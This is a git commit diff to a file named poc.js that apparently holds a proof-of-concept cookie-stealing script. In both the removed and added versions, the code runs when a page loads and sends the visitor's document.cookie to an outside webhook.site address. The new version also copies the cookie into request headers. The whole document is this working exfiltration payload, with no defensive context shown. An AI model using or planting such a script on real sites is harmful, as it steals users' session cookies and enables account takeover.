8684cf94ca87fada99b2371b83bd6c3dd494b2ac
RE <turbine@UnknownHardware.localdomain>
2023-02-08 12:16:43 -0500

    Initial Commit

--- poc.js
+++ poc.js
@@ -1,5 +1,9 @@
 window.onload = function() {
-  fetch(`https://webhook.site/96cc3072-024a-489c-ada9-0d43689d3cc8?cookie=${encodeURIComponent(document.cookie)}`, {
-    method: 'GET'
+  fetch('https://webhook.site/96cc3072-024a-489c-ada9-0d43689d3cc8?cookie=' + encodeURIComponent(document.cookie), {
+    method: 'GET',
+    headers: {
+      'Content-Type': 'application/json',
+      'Cookie': document.cookie
+    }
   });
 };
